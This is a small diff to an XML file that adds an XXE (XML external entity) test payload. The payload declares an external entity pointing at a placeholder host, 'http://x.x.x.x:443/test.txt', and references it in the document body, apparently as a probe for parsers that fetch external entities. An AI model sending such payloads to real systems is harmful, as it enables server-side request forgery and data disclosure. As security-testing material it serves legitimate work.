@@ -1,2 +1,7 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-  <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]><data>&ext;</data>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
+]>
+<r>&sp;</r>
+
